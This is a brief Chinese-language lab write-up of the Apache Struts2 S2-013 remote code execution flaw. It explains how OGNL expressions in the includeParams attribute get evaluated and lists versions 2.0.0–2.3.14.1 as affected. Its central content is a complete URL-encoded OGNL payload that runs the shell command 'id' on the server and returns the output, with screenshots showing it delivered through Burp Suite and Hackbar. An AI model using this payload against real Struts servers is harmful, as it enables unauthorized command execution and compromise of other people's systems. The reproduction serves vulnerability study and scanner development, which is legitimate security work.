# Struts2_013_远程代码执行

###### by ADummy

### 0x00利用路线

​			直接url执行payload，由于浏览器url输入框的长度有限，可以使用Hackbar插件，或burpsuite抓包测试。

### 0x01漏洞介绍

​			<s:a>includeParams="all">Click here.</s:a>,这个是struts2标签库的a标签，该标签会在页面上显示当前URL

Struts2标签库中的url标签和a标签的includeParams这个属性，代表显示请求访问参数的含义，一旦它的值被赋予ALL或者GET或者POST,就会显示具体请求参数内容。按照正常的需求,把参数urlEncode一下也就够了， 问题在于，struts把参数做了OGNL解析,导致OGNL表达式的执行。

​			影响版本

  		2.0.0 - 2.3.14.1

### 0x02漏洞复现

#### payload：

link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('**id**').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('**dbapp%3D**'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D



​			登录界面

![S2_013_rce_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_013_rce_1.png)



​			Burpsuite抓包

![S2_013_rce_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_013_rce_2.png)

​				

​			Hackbar执行payload

![S2_013_rce_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_013_rce_3.jpg)

### 0x03总结

​				这是笔者的第二篇文章，由于我目前在华顺信安实习，写一些漏洞的POC和EXP，搜集一些可以利用的漏洞，补充到Goby扫描器中。今天刚好在师傅的带领下写了这个漏洞的POC，由于年代久远，及同样的框架完全可以由很多漏洞解决。但还是很具有学习意义。笔者较菜，暂时不能做代码分析。如果有需要，强烈推荐Devil师傅的文章。共勉！

### 0x04参考资料

https://www.cnblogs.com/devi1/p/13486629.html